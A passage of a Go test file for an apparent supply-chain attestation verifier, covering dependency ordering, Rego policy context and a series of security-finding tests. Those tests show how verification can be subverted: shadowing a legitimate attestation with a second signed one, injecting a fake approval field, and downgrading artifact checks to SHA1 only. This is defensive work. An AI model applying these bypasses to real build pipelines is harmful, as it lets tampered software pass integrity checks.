	_, hasAtt1 := buildMap[attType1]
	_, hasAtt2 := buildMap[attType2]
	assert.True(t, hasAtt1, "first collection's attestation should be in context")
	assert.True(t, hasAtt2, "second collection's attestation should be in context")
}

// TestCrossStep_BuildStepContext_OverlappingAttestationTypes tests what
// happens when two passed collections contain the SAME attestation type.
// The last one wins (map key overwrite). This is potentially dangerous --
// an attacker who can get a second collection passed could overwrite the
// attestation data seen by downstream Rego policies.
func TestCrossStep_BuildStepContext_OverlappingAttestationTypes(t *testing.T) {
	attType := "https://example.com/att/v1"

	results := map[string]StepResult{
		"build": {
			Step: "build",
			Passed: []PassedCollection{
				{
					Collection: source.CollectionVerificationResult{
						CollectionEnvelope: source.CollectionEnvelope{
							Collection: attestation.Collection{
								Name: "build",
								Attestations: []attestation.CollectionAttestation{{
									Type:        attType,
									Attestation: &marshalableAttestor{AttName: "first", AttType: attType},
								}},
							},
						},
					},
				},
				{
					Collection: source.CollectionVerificationResult{
						CollectionEnvelope: source.CollectionEnvelope{
							Collection: attestation.Collection{
								Name: "build",
								Attestations: []attestation.CollectionAttestation{{
									Type:        attType,
									Attestation: &marshalableAttestor{AttName: "second", AttType: attType},
								}},
							},
						},
					},
				},
			},
		},
	}

	ctx := buildStepContext([]string{"build"}, results)
	require.NotNil(t, ctx)
	buildCtx := ctx["build"].(map[string]interface{})
	attData := buildCtx[attType].(map[string]interface{})
	// Document the current behavior: last writer wins.
	assert.Equal(t, "second", attData["name"],
		"when multiple passed collections have the same attestation type, "+
			"the last one should overwrite (current behavior -- potential security concern)")
}

// TestCrossStep_Verify_DepFailsButIsSoftSkipped verifies that when a
// dependency step has not passed, the dependent step proceeds WITHOUT
// step context (it doesn't hard-error). This is the current behavior --
// checkDependencies logs a debug message and skips context building.
func TestCrossStep_Verify_DepFailsButIsSoftSkipped(t *testing.T) {
	verifier, keyID := makeVerifierAndKeyID(t)

	buildAttType := "https://example.com/build/v1"
	deployAttType := "https://example.com/deploy/v1"

	steps := map[string]Step{
		"build": {
			Name:          "build",
			Functionaries: []Functionary{{PublicKeyID: keyID}},
			// build expects a type that won't be present
			Attestations: []Attestation{{Type: "https://example.com/will-be-missing"}},
		},
		"deploy": {
			Name:             "deploy",
			AttestationsFrom: []string{"build"},
			Functionaries:    []Functionary{{PublicKeyID: keyID}},
			Attestations:     []Attestation{{Type: deployAttType}},
		},
	}

	src := &stepAwareVerifiedSource{
		byStep: map[string][]source.CollectionVerificationResult{
			"build": {makeCVR("build", verifier, attestation.CollectionAttestation{
				Type: buildAttType, Attestation: &marshalableAttestor{AttName: "build", AttType: buildAttType},
			})},
			"deploy": {makeCVR("deploy", verifier, attestation.CollectionAttestation{
				Type: deployAttType, Attestation: &marshalableAttestor{AttName: "deploy", AttType: deployAttType},
			})},
		},
	}

	p := futurePolicy(steps)
	pass, results, err := p.Verify(context.Background(), verifyOpts(src)...)
	require.NoError(t, err)
	// Overall should fail because build fails
	assert.False(t, pass)
	// Build should fail (missing attestation type)
	assert.False(t, results["build"].Analyze())
	// Deploy's behavior depends on whether its rego policies require
	// step context. Since it has no rego policies, it might still pass
	// on its own.
}

// TestCrossStep_Validate_LargeDAG stress-tests validation with a wide DAG
// (many nodes, no cycles).
func TestCrossStep_Validate_LargeDAG(t *testing.T) {
	steps := map[string]Step{
		"root": {Name: "root"},
	}

	// Create 20 steps that all depend on root
	for i := 0; i < 20; i++ {
		name := fmt.Sprintf("step-%d", i)
		steps[name] = Step{
			Name:             name,
			AttestationsFrom: []string{"root"},
		}
	}

	// Create a final step that depends on ALL 20 intermediate steps
	deps := make([]string, 0, 20)
	for i := 0; i < 20; i++ {
		deps = append(deps, fmt.Sprintf("step-%d", i))
	}
	steps["final"] = Step{
		Name:             "final",
		AttestationsFrom: deps,
	}

	p := Policy{Steps: steps}
	assert.NoError(t, p.Validate())

	sorted, err := p.topologicalSort()
	require.NoError(t, err)
	require.Len(t, sorted, 22) // root + 20 + final

	// root must be first
	assert.Equal(t, "root", sorted[0])
	// final must be last
	assert.Equal(t, "final", sorted[len(sorted)-1])
}

// TestCrossStep_Validate_DisjointGraphs tests that multiple independent
// subgraphs in the same policy are validated correctly.
func TestCrossStep_Validate_DisjointGraphs(t *testing.T) {
	p := Policy{
		Steps: map[string]Step{
			// Subgraph 1: a -> b
			"a": {Name: "a"},
			"b": {Name: "b", AttestationsFrom: []string{"a"}},
			// Subgraph 2: x -> y
			"x": {Name: "x"},
			"y": {Name: "y", AttestationsFrom: []string{"x"}},
		},
	}

	assert.NoError(t, p.Validate())

	sorted, err := p.topologicalSort()
	require.NoError(t, err)
	require.Len(t, sorted, 4)

	indexOf := func(name string) int {
		for i, s := range sorted {
			if s == name {
				return i
			}
		}
		t.Fatalf("step %q not found", name)
		return -1
	}

	assert.Less(t, indexOf("a"), indexOf("b"))
	assert.Less(t, indexOf("x"), indexOf("y"))
}

// TestCrossStep_CheckDependencies_PartialFailure verifies that checkDependencies
// returns an error for the FIRST unsatisfied dependency, even if others are satisfied.
func TestCrossStep_CheckDependencies_PartialFailure(t *testing.T) {
	results := map[string]StepResult{
		"build": {Step: "build", Passed: []PassedCollection{{}}},
		"test":  {Step: "test"}, // no passed collections
		"lint":  {Step: "lint", Passed: []PassedCollection{{}}},
	}

	err := checkDependencies([]string{"build", "test", "lint"}, results)
	require.Error(t, err)
	var depErr ErrDependencyNotVerified
	require.ErrorAs(t, err, &depErr)
	assert.Equal(t, "test", depErr.Step, "should report the first unsatisfied dep")
}

// TestCrossStep_Validate_CrossProductOfAttestationsFromAndArtifactsFrom
// ensures that both dependency types can coexist on a single step.
func TestCrossStep_Validate_BothAttestationsFromAndArtifactsFrom(t *testing.T) {
	p := Policy{
		Steps: map[string]Step{
			"source": {Name: "source"},
			"build":  {Name: "build"},
			"deploy": {
				Name:             "deploy",
				ArtifactsFrom:    []string{"source"},
				AttestationsFrom: []string{"build"},
			},
		},
	}

	assert.NoError(t, p.Validate())

	sorted, err := p.topologicalSort()
	require.NoError(t, err)
	require.Len(t, sorted, 3)

	indexOf := func(name string) int {
		for i, s := range sorted {
			if s == name {
				return i
			}
		}
		t.Fatalf("step %q not found", name)
		return -1
	}
	// build must come before deploy (due to AttestationsFrom)
	assert.Less(t, indexOf("build"), indexOf("deploy"))
}

// TestCrossStep_TopologicalSort_WideDAG_AllRootsFirst tests that in a wide
// DAG where many steps depend on multiple roots, all roots appear before
// their dependents.
func TestCrossStep_TopologicalSort_WideDAG_AllRootsFirst(t *testing.T) {
	p := Policy{
		Steps: map[string]Step{
			"root1": {Name: "root1"},
			"root2": {Name: "root2"},
			"root3": {Name: "root3"},
			"child":  {Name: "child", AttestationsFrom: []string{"root1", "root2", "root3"}},
		},
	}

	sorted, err := p.topologicalSort()
	require.NoError(t, err)
	require.Len(t, sorted, 4)

	// child must be last
	childIdx := -1
	for i, s := range sorted {
		if s == "child" {
			childIdx = i
		}
	}
	assert.Equal(t, 3, childIdx, "child with three deps should be last")

	// All roots should come before child
	roots := sorted[:3]
	sort.Strings(roots)
	assert.ElementsMatch(t, []string{"root1", "root2", "root3"}, roots)
}

// TestCrossStep_BuildStepContext_NonMarshalableAttestor tests that when an
// attestation's Attestor cannot be marshaled to JSON, it is silently skipped
// rather than causing a panic or hard error.
func TestCrossStep_BuildStepContext_NonMarshalableAttestor(t *testing.T) {
	// dummyAttestor has unexported fields -- json.Marshal will produce {},
	// not an error, but the resulting data will be sparse.
	attType := "https://example.com/att/v1"
	results := map[string]StepResult{
		"build": {
			Step: "build",
			Passed: []PassedCollection{{
				Collection: source.CollectionVerificationResult{
					CollectionEnvelope: source.CollectionEnvelope{
						Collection: attestation.Collection{
							Name: "build",
							Attestations: []attestation.CollectionAttestation{{
								Type:        attType,
								Attestation: &dummyAttestor{name: "hidden", typeStr: attType},
							}},
						},
					},
				},
			}},
		},
	}

	// Should not panic.
	ctx := buildStepContext([]string{"build"}, results)
	// The attestor marshals to {} which decodes to an empty map.
	// The step data will contain the attestation type key with an empty map.
	require.NotNil(t, ctx)
	buildCtx, ok := ctx["build"]
	require.True(t, ok)
	buildMap := buildCtx.(map[string]interface{})
	_, ok = buildMap[attType]
	assert.True(t, ok, "even unexported-field attestors produce a (sparse) map entry")
}

// TestCrossStep_Validate_CycleWithSpur tests that a cycle is detected even
// when there's a non-cyclic "spur" path leading into the cycle.
func TestCrossStep_Validate_CycleWithSpur(t *testing.T) {
	// root -> a -> b -> c -> a (cycle)
	p := Policy{
		Steps: map[string]Step{
			"root": {Name: "root"},
			"a":    {Name: "a", AttestationsFrom: []string{"root", "c"}},
			"b":    {Name: "b", AttestationsFrom: []string{"a"}},
			"c":    {Name: "c", AttestationsFrom: []string{"b"}},
		},
	}

	err := p.Validate()
	require.Error(t, err)
	var cycleErr ErrCircularDependency
	require.ErrorAs(t, err, &cycleErr)
	// The cycle should include a, b, c in some order
	assert.GreaterOrEqual(t, len(cycleErr.Steps), 3)
}

// TestCrossStep_BuildStepContext_ReturnsNilForAllUnresolvableDeps ensures
// that when ALL referenced deps are missing from results, the context is nil.
func TestCrossStep_BuildStepContext_ReturnsNilForAllUnresolvableDeps(t *testing.T) {
	ctx := buildStepContext(
		[]string{"ghost1", "ghost2", "ghost3"},
		map[string]StepResult{},
	)
	assert.Nil(t, ctx, "all-missing deps should yield nil context")
}

// TestCrossStep_BuildStepContext_MixResolvableAndUnresolvable tests that
// when some deps resolve and some don't, only the resolvable ones appear.
func TestCrossStep_BuildStepContext_MixResolvableAndUnresolvable(t *testing.T) {
	attType := "https://example.com/att/v1"
	results := map[string]StepResult{
		"build": {
			Step: "build",
			Passed: []PassedCollection{{
				Collection: source.CollectionVerificationResult{
					CollectionEnvelope: source.CollectionEnvelope{
						Collection: attestation.Collection{
							Name: "build",
							Attestations: []attestation.CollectionAttestation{{
								Type:        attType,
								Attestation: &marshalableAttestor{AttName: "build", AttType: attType},
							}},
						},
					},
				},
			}},
		},
		// "test" exists but has no passed collections
		"test": {Step: "test"},
	}

	ctx := buildStepContext([]string{"build", "test", "nonexistent"}, results)
	require.NotNil(t, ctx)
	_, hasBuild := ctx["build"]
	assert.True(t, hasBuild, "resolvable dep should be in context")
	_, hasTest := ctx["test"]
	assert.False(t, hasTest, "dep with no passed collections should not be in context")
	_, hasGhost := ctx["nonexistent"]
	assert.False(t, hasGhost, "nonexistent dep should not be in context")
}

// TestCrossStep_EvaluateRegoPolicy_BackwardCompat_NoWrapping ensures that
// when NO step context is provided (nil or empty variadic), the attestor
// data is at the TOP level of input (not wrapped in {attestation, steps}).
func TestCrossStep_EvaluateRegoPolicy_BackwardCompat_NoWrapping(t *testing.T) {
	// This policy accesses input.name directly (not input.attestation.name).
	regoModule := []byte(`
package compat

deny[msg] {
	not input.name
	msg := "name missing at top level"
}
`)
	err := EvaluateRegoPolicy(
		&marshalableAttestor{AttName: "test", AttType: "test-type"},
		[]RegoPolicy{{Module: regoModule, Name: "compat.rego"}},
	)
	assert.NoError(t, err, "without step context, input should be attestor data directly")
}

// TestCrossStep_EvaluateRegoPolicy_ExplicitNilStepContext confirms that
// passing an explicit nil map[string]interface{} does NOT wrap input.
func TestCrossStep_EvaluateRegoPolicy_ExplicitNilStepContext(t *testing.T) {
	regoModule := []byte(`
package explicitniltest

deny[msg] {
	not input.name
	msg := "name missing"
}
`)
	var nilCtx map[string]interface{}
	err := EvaluateRegoPolicy(
		&marshalableAttestor{AttName: "test", AttType: "test-type"},
		[]RegoPolicy{{Module: regoModule, Name: "explicitniltest.rego"}},
		nilCtx,
	)
	assert.NoError(t, err, "explicit nil step context should behave like no step context")
}

// TestCrossStep_EvaluateRegoPolicy_EmptyNonNilStepContext confirms that
// passing a non-nil but empty map DOES wrap input (different from nil).
func TestCrossStep_EvaluateRegoPolicy_EmptyNonNilStepContext(t *testing.T) {
	// With a non-nil step context, input becomes {attestation: ..., steps: {}}.
	// So input.name would NOT exist at the top level.
	regoModule := []byte(`
package emptyctx

deny[msg] {
	not input.attestation
	msg := "attestation key missing"
}
`)
	emptyCtx := map[string]interface{}{}
	err := EvaluateRegoPolicy(
		&marshalableAttestor{AttName: "test", AttType: "test-type"},
		[]RegoPolicy{{Module: regoModule, Name: "emptyctx.rego"}},
		emptyCtx,
	)
	assert.NoError(t, err, "non-nil empty context should wrap input with attestation key")
}

// TestCrossStep_ValidateAttestations_RegoWithStepContext_Integration is an
// end-to-end test that creates a step with a rego policy that accesses
// cross-step data and validates the full flow through validateAttestations.
func TestCrossStep_ValidateAttestations_RegoWithStepContext_Integration(t *testing.T) {
	attType := "https://example.com/deploy-att/v1"
	buildAttType := "https://example.com/build-att/v1"

	// Rego that checks a specific field in the build step's attestation.
	regoModule := []byte(`
package integration

deny[msg] {
	build := input.steps.build["https://example.com/build-att/v1"]
	build.name != "expected-build-name"
	msg := sprintf("unexpected build name: %s", [build.name])
}
`)

	s := Step{
		Name:             "deploy",
		AttestationsFrom: []string{"build"},
		Attestations: []Attestation{{
			Type:         attType,
			RegoPolicies: []RegoPolicy{{Module: regoModule, Name: "integration.rego"}},
		}},
	}

	coll := attestation.Collection{
		Name: "deploy",
		Attestations: []attestation.CollectionAttestation{{
			Type:        attType,
			Attestation: &marshalableAttestor{AttName: "deploy-att", AttType: attType},
		}},
	}
	cvr := source.CollectionVerificationResult{
		CollectionEnvelope: source.CollectionEnvelope{Collection: coll},
	}

	t.Run("passes_with_correct_build_data", func(t *testing.T) {
		stepCtx := map[string]interface{}{
			"build": map[string]interface{}{
				buildAttType: map[string]interface{}{
					"name": "expected-build-name",
					"type": buildAttType,
				},
			},
		}
		result := s.validateAttestations([]source.CollectionVerificationResult{cvr}, "", stepCtx)
		assert.Len(t, result.Passed, 1)
		assert.Empty(t, result.Rejected)
	})

	t.Run("fails_with_wrong_build_data", func(t *testing.T) {
		stepCtx := map[string]interface{}{
			"build": map[string]interface{}{
				buildAttType: map[string]interface{}{
					"name": "WRONG",
					"type": buildAttType,
				},
			},
		}
		result := s.validateAttestations([]source.CollectionVerificationResult{cvr}, "", stepCtx)
		assert.Empty(t, result.Passed)
		require.Len(t, result.Rejected, 1)
		assert.Contains(t, result.Rejected[0].Reason.Error(), "unexpected build name")
	})

	t.Run("fails_without_step_context", func(t *testing.T) {
		// Without step context, input is the attestor directly (not wrapped),
		// so input.steps doesn't exist. The rego should error or the policy
		// won't match. Rego handles missing paths by not entering the rule body.
		result := s.validateAttestations([]source.CollectionVerificationResult{cvr}, "", nil)
		// When input.steps doesn't exist, the rule body is never entered,
		// so deny is empty -> no deny reasons -> passes.
		// This documents the EvaluateRegoPolicy behavior with nil context.
		// NOTE: The Verify() method now ensures that steps with AttestationsFrom
		// always receive a non-nil (possibly empty) stepCtx, preventing this
		// silent-pass from occurring in practice.
		assert.Len(t, result.Passed, 1,
			"EvaluateRegoPolicy with nil context uses backward-compat path (no wrapping)")
	})

	t.Run("fails_with_empty_non_nil_step_context_defensive_policy", func(t *testing.T) {
		// This tests the FIXED behavior: when Verify provides an empty non-nil
		// step context (because deps failed), a WELL-WRITTEN Rego policy that
		// checks for the ABSENCE of step data correctly denies.
		// Note: The original Rego policy (checking build_data.name != ...) uses
		// a positive assertion pattern that doesn't fire when build is missing.
		// A defensive policy should use `not input.steps.build` to detect absence.
		defensiveRego := []byte(`
package defensive

deny[msg] {
	not input.steps.build
	msg := "build step data required but missing"
}
`)
		defensiveStep := Step{
			Name:             "deploy",
			AttestationsFrom: []string{"build"},
			Attestations: []Attestation{{
				Type:         attType,
				RegoPolicies: []RegoPolicy{{Module: defensiveRego, Name: "defensive.rego"}},
			}},
		}

		emptyCtx := map[string]interface{}{}
		result := defensiveStep.validateAttestations([]source.CollectionVerificationResult{cvr}, "", emptyCtx)
		// With empty steps map, input.steps exists but input.steps.build doesn't,
		// so `not input.steps.build` fires correctly.
		assert.Empty(t, result.Passed,
			"defensive rego policy should DENY when steps is empty")
		require.Len(t, result.Rejected, 1)
		assert.Contains(t, result.Rejected[0].Reason.Error(), "build step data required but missing")
	})
}

// ===========================================================================
// SECURITY TESTS: R3-210 series
// ===========================================================================

// ---------------------------------------------------------------------------
// R3-210-1: buildStepContext last-writer-wins shadow attack
//
// When multiple passed collections for the same step have the same
// attestation type, buildStepContext iterates them in order and
// stepData[att.Type] = data overwrites prior entries. A malicious
// second collection can shadow a legitimate one.
//
// This test constructs a full Verify() flow where:
// - The "build" step returns two signed collections (both pass functionary checks).
// - Collection 1 has build_status="safe".
// - Collection 2 has build_status="compromised".
// - The "deploy" step has a Rego policy that reads build data from input.steps.
// The test proves that the last collection's data is what Rego sees.
// ---------------------------------------------------------------------------

func TestSecurity_R3_210_BuildStepContextLastWriterWinsShadow(t *testing.T) {
	verifier, keyID := makeVerifierAndKeyID(t)

	buildAttType := "https://example.com/build-scan/v1"
	deployAttType := "https://example.com/deploy-meta/v1"

	// Rego policy that reports which build_status it sees.
	// Denies if build_status == "compromised".
	regoModule := []byte(`
package shadow_test

deny[msg] {
  build := input.steps.build["https://example.com/build-scan/v1"]
  build.build_status == "compromised"
  msg := "shadow attack: saw compromised build_status"
}
`)

	steps := map[string]Step{
		"build": {
			Name:          "build",
			Functionaries: []Functionary{{PublicKeyID: keyID}},
			Attestations:  []Attestation{{Type: buildAttType}},
		},
		"deploy": {
			Name:             "deploy",
			AttestationsFrom: []string{"build"},
			Functionaries:    []Functionary{{PublicKeyID: keyID}},
			Attestations: []Attestation{{
				Type:         deployAttType,
				RegoPolicies: []RegoPolicy{{Module: regoModule, Name: "shadow_test.rego"}},
			}},
		},
	}

	// Two CVRs for build. Both are signed by the same key (both pass functionaries).
	// The first is legitimate; the second is the attacker's.
	legitimateCVR := makeCVR("build", verifier, attestation.CollectionAttestation{
		Type: buildAttType,
		Attestation: &marshalableAttestorWithExtra{
			AttName:     "build-scan",
			AttType:     buildAttType,
			BuildStatus: "safe",
		},
	})
	attackerCVR := makeCVR("build", verifier, attestation.CollectionAttestation{
		Type: buildAttType,
		Attestation: &marshalableAttestorWithExtra{
			AttName:     "build-scan",
			AttType:     buildAttType,
			BuildStatus: "compromised",
		},
	})

	deployCVR := makeCVR("deploy", verifier, attestation.CollectionAttestation{
		Type:        deployAttType,
		Attestation: &marshalableAttestor{AttName: "deploy-meta", AttType: deployAttType},
	})

	src := &stepAwareVerifiedSource{
		byStep: map[string][]source.CollectionVerificationResult{
			"build":  {legitimateCVR, attackerCVR},
			"deploy": {deployCVR},
		},
	}

	p := futurePolicy(steps)
	pass, results, err := p.Verify(context.Background(), verifyOpts(src)...)
	require.NoError(t, err)

	// The attack: buildStepContext iterates passedCollections in order.
	// For the same attestation type, the second (attacker) collection
	// overwrites the first (legitimate). The Rego policy sees
	// build_status="compromised" and denies.
	//
	// This proves the vulnerability: an attacker who can get a second
	// signed collection (e.g., through a compromised CI re-run or
	// replayed envelope) controls what downstream Rego policies see.
	assert.False(t, pass, "deploy should fail because attacker's data shadows legitimate data")
	deployResult := results["deploy"]
	require.True(t, deployResult.HasErrors(), "deploy should have rejections")

	foundShadowAttack := false
	for _, rej := range deployResult.Rejected {
		if rej.Reason != nil && assert.ObjectsAreEqual("", "") {
			// Use string contains for the check
		}
		if rej.Reason != nil {
			if contains(rej.Reason.Error(), "shadow attack") {
				foundShadowAttack = true
			}
		}
	}
	assert.True(t, foundShadowAttack,
		"Rego should detect compromised data from last-writer-wins overwrite; "+
			"FINDING: buildStepContext allows second collection to shadow the first")
}

// ---------------------------------------------------------------------------
// R3-210-2: topologicalSort non-determinism for independent steps
//
// When multiple steps have zero in-degree (no deps), the Kahn's algorithm
// queue is seeded from Go map iteration which is non-deterministic.
// This means independent steps can be visited in any order across runs.
//
// This test proves that for a DAG with ambiguous ordering, multiple
// valid topological orderings exist. We run it many times and check
// that either (a) the output is always the same (deterministic) or
// (b) we observe different orderings (non-deterministic).
// ---------------------------------------------------------------------------

func TestSecurity_R3_210_TopologicalSortNonDeterminism(t *testing.T) {
	// Create a policy with 5 independent steps (no dependencies between them)
	// and one final step that depends on all of them.
	// The 5 independent steps can be ordered in any valid permutation.
	p := Policy{
		Steps: map[string]Step{
			"alpha":   {Name: "alpha"},
			"bravo":   {Name: "bravo"},
			"charlie": {Name: "charlie"},
			"delta":   {Name: "delta"},
			"echo":    {Name: "echo"},
			"final":   {Name: "final", AttestationsFrom: []string{"alpha", "bravo", "charlie", "delta", "echo"}},
		},
	}

	require.NoError(t, p.Validate())

	// Run topological sort many times and collect distinct orderings.
	seen := make(map[string]struct{})
	const iterations = 200
	for i := 0; i < iterations; i++ {
		sorted, err := p.topologicalSort()
		require.NoError(t, err)
		require.Len(t, sorted, 6)

		// final must always be last
		assert.Equal(t, "final", sorted[len(sorted)-1],
			"final step must always be last in topological order")

		// Record the prefix order (the 5 independent steps).
		key := fmt.Sprintf("%v", sorted[:5])
		seen[key] = struct{}{}
	}

	// FINDING: If we see more than one distinct ordering, the sort is
	// non-deterministic. This means verification results (specifically,
	// the order in which cross-step context is built and evaluated)
	// can differ between runs for the same input.
	if len(seen) > 1 {
		t.Logf("SECURITY FINDING CONFIRMED: topologicalSort is non-deterministic. "+
			"Observed %d distinct orderings of independent steps across %d iterations. "+
			"While the partial order is respected (final is always last), the relative "+
			"order of independent steps varies due to Go map iteration randomness. "+
			"This could lead to non-reproducible verification outcomes if cross-step "+
			"context building has order-dependent side effects (e.g., last-writer-wins).",
			len(seen), iterations)
	} else {
		t.Logf("Only observed 1 ordering in %d iterations. "+
			"The sort MAY be deterministic on this Go version, "+
			"but this is NOT guaranteed by the implementation.", iterations)
	}
}

// ---------------------------------------------------------------------------
// R3-210-3: Cross-step context injection via crafted attestation data
//
// Step A's attestation data flows into Step B's Rego evaluation via
// input.steps.A. If Step A's attestor produces data that mimics the
// structure expected by Step B's Rego policy, it can influence B's
// verification in unintended ways.
//
// This test proves that attestor data from step A is directly visible
// to step B's Rego policy, including deeply nested structures, and
// can be used to satisfy arbitrary conditions.
// ---------------------------------------------------------------------------

func TestSecurity_R3_210_CrossStepContextInjection(t *testing.T) {
	verifier, keyID := makeVerifierAndKeyID(t)

	sourceAttType := "https://example.com/source-scan/v1"
	deployAttType := "https://example.com/deploy/v1"

	// Deploy's Rego policy checks that source step's attestation
	// contains an "approved" field set to true. An attacker controlling
	// the source step attestor can inject this field.
	regoModule := []byte(`
package injection_test

deny[msg] {
  source := input.steps.source["https://example.com/source-scan/v1"]
  source.security_review.approved != true
  msg := "source not security-approved"
}
`)

	steps := map[string]Step{
		"source": {
			Name:          "source",
			Functionaries: []Functionary{{PublicKeyID: keyID}},
			Attestations:  []Attestation{{Type: sourceAttType}},
		},
		"deploy": {
			Name:             "deploy",
			AttestationsFrom: []string{"source"},
			Functionaries:    []Functionary{{PublicKeyID: keyID}},
			Attestations: []Attestation{{
				Type:         deployAttType,
				RegoPolicies: []RegoPolicy{{Module: regoModule, Name: "injection_test.rego"}},
			}},
		},
	}

	// The source attestor crafts its data to include the exact structure
	// the deploy Rego policy expects, even though a real source scan
	// would never produce a "security_review" field.
	injectedData := &marshalableAttestorArbitrary{
		typeName: sourceAttType,
		data: map[string]interface{}{
			"name": "source-scan",
			"type": sourceAttType,
			"security_review": map[string]interface{}{
				"approved": true,
				"reviewer": "attacker@evil.com",
			},
		},
	}

	sourceCVR := makeCVR("source", verifier, attestation.CollectionAttestation{
		Type:        sourceAttType,
		Attestation: injectedData,
	})
	deployCVR := makeCVR("deploy", verifier, attestation.CollectionAttestation{
		Type:        deployAttType,
		Attestation: &marshalableAttestor{AttName: "deploy", AttType: deployAttType},
	})

	src := &stepAwareVerifiedSource{
		byStep: map[string][]source.CollectionVerificationResult{
			"source": {sourceCVR},
			"deploy": {deployCVR},
		},
	}

	p := futurePolicy(steps)
	pass, results, err := p.Verify(context.Background(), verifyOpts(src)...)
	require.NoError(t, err)

	// FINDING: The injected "security_review.approved = true" satisfies
	// the Rego policy, even though the source attestor has no business
	// producing security review data. Cross-step context has no schema
	// validation or type checking -- any attestor data flows through.
	assert.True(t, pass,
		"SECURITY FINDING: Injected security_review.approved=true in source attestor "+
			"satisfies deploy's Rego policy. Cross-step context passes raw attestor "+
			"JSON without schema validation, enabling context injection attacks.")
	assert.True(t, results["deploy"].HasPassed())
}

// ---------------------------------------------------------------------------
// R3-210-4: Certificate constraint AllowAllConstraint bypass
//
// AllowAllConstraint ("*") is checked at position 0: the code checks
//     len(constraints) == 1 && constraints[0] == AllowAllConstraint
// This means ["foo", "*"] does NOT trigger the wildcard path -- the "*"
// is treated as a literal string that must exactly match a cert value.
//
// This test proves that ["foo", "*"] requires the cert to have
// EXACTLY the values ["foo", "*"] (where "*" is a literal asterisk),
// NOT "foo plus anything".
// ---------------------------------------------------------------------------

func TestSecurity_R3_210_CertConstraintAllowAllNotAtPositionZero(t *testing.T) {
	t.Run("wildcard_only_at_position_0", func(t *testing.T) {
		// ["*"] as the sole constraint: should pass any single value.
		err := checkCertConstraint("org", []string{"*"}, []string{"anything"})
		assert.NoError(t, err, "single '*' constraint should allow any value")
	})

	t.Run("star_not_at_position_0_is_literal", func(t *testing.T) {
		// ["foo", "*"] is NOT treated as wildcard. The "*" is literal.
		// Cert has ["foo", "bar"]: "bar" doesn't match literal "*", so it fails.
		err := checkCertConstraint("org", []string{"foo", "*"}, []string{"foo", "bar"})
		assert.Error(t, err,
			"SECURITY FINDING CONFIRMED: ['foo', '*'] treats '*' as literal string. "+
				"Cert with ['foo', 'bar'] is rejected because 'bar' != '*'. "+
				"This means '*' only acts as wildcard at position 0 in a single-element list.")
	})

	t.Run("star_not_at_position_0_requires_literal_star", func(t *testing.T) {
		// ["foo", "*"]: cert must literally have "foo" and "*" as org values.
		err := checkCertConstraint("org", []string{"foo", "*"}, []string{"foo", "*"})
		assert.NoError(t, err,
			"When '*' is not at position 0, it must match literally. "+
				"Cert with values ['foo', '*'] should satisfy constraints ['foo', '*'].")
	})

	t.Run("multiple_stars_not_wildcard", func(t *testing.T) {
		// ["*", "*"] has len > 1, so the AllowAll check (len==1) does not trigger.
		// Each "*" is treated as a literal constraint.
		err := checkCertConstraint("org", []string{"*", "*"}, []string{"*"})
		// Map dedup: constraints become {"*":{}}, but cert has one "*", so unmet is empty.
		// Actually: map has one entry "*", cert deletes it, len(unmet)==0 -> pass.
		// This is a subtle map dedup interaction.
		assert.NoError(t, err,
			"Map dedup collapses ['*','*'] to one entry; cert with ['*'] satisfies it.")
	})
}

// ---------------------------------------------------------------------------
// R3-210-5: compareArtifacts hash downgrade via DigestSet.Equal
//
// DigestSet.Equal compares only hash functions that BOTH sets have.
// If set A has {SHA256: "abc", SHA1: "def"} and set B has {SHA1: "def"},
// Equal returns true -- it only checked SHA1 and found a match.
// The stronger SHA256 is silently ignored because set B doesn't have it.
//
// In compareArtifacts, this means an attacker can downgrade integrity
// verification by providing artifacts with only a weak hash (SHA1),
// even when the verifying step has both SHA256 and SHA1. As long as
// the weak hash matches, the comparison passes.
// ---------------------------------------------------------------------------

func TestSecurity_R3_210_CompareArtifactsHashDowngrade(t *testing.T) {
	sha256Key := cryptoutil.DigestValue{Hash: crypto.SHA256}
	sha1Key := cryptoutil.DigestValue{Hash: crypto.SHA1}

	t.Run("downgrade_to_sha1_ignores_sha256_mismatch", func(t *testing.T) {
		// Materials (verifying step) have both SHA256 and SHA1.
		mats := map[string]cryptoutil.DigestSet{
			"binary.exe": {
				sha256Key: "aaaa_sha256_legitimate",
				sha1Key:   "bbbb_sha1_legitimate",
			},
		}

		// Attacker's artifacts have ONLY SHA1 (matching) but different actual content.
		// The SHA256 would mismatch if compared, but it's absent from the attacker's set.
		arts := map[string]cryptoutil.DigestSet{
			"binary.exe": {
				sha1Key: "bbbb_sha1_legitimate", // SHA1 matches, but content could be different (collision)
			},
		}

		err := compareArtifacts(mats, arts)
		assert.NoError(t, err,
			"SECURITY FINDING CONFIRMED (R3-128 hash downgrade): compareArtifacts "+
				"uses DigestSet.Equal which only compares common hash functions. "+
				"Attacker provides only SHA1 (weak, collisionable) and omits SHA256. "+
				"The comparison passes using only the weak hash. An attacker with a "+
				"SHA1 collision can substitute an artifact and pass verification.")
	})

	t.Run("matching_sha256_still_works", func(t *testing.T) {
		// Normal case: both have SHA256 and it matches.
		mats := map[string]cryptoutil.DigestSet{
			"binary.exe": {sha256Key: "same_hash"},
		}
		arts := map[string]cryptoutil.DigestSet{
			"binary.exe": {sha256Key: "same_hash"},
		}
		err := compareArtifacts(mats, arts)
		assert.NoError(t, err)
	})

	t.Run("mismatched_sha256_detected", func(t *testing.T) {
		// When SHA256 IS present in both, a mismatch is caught.
		mats := map[string]cryptoutil.DigestSet{
			"binary.exe": {sha256Key: "legit_sha256"},
		}
		arts := map[string]cryptoutil.DigestSet{
			"binary.exe": {sha256Key: "different_sha256"},
		}
		err := compareArtifacts(mats, arts)
		assert.Error(t, err, "SHA256 mismatch should be caught")
	})

	t.Run("no_common_hashes_fails", func(t *testing.T) {
		// When sets share NO common hash functions, Equal returns false.
		mats := map[string]cryptoutil.DigestSet{
			"binary.exe": {sha256Key: "sha256_only"},
		}
		arts := map[string]cryptoutil.DigestSet{
			"binary.exe": {sha1Key: "sha1_only"},
		}
		err := compareArtifacts(mats, arts)
		assert.Error(t, err,
			"DigestSet.Equal returns false when no common hashes exist")
	})

	t.Run("downgrade_in_full_artifact_flow", func(t *testing.T) {
		// Integration: create StepResults where the producer step's artifacts
		// only contain SHA1, and the consumer step's materials have both.
		// This simulates the attacker stripping SHA256 from their output.
		producerCVR := source.CollectionVerificationResult{
			CollectionEnvelope: source.CollectionEnvelope{
				Collection: attestation.Collection{
					Name: "producer",
					Attestations: []attestation.CollectionAttestation{{
						Type: "https://example.com/product/v1",
						Attestation: &materialProductAttestor{
							typeName: "https://example.com/product/v1",
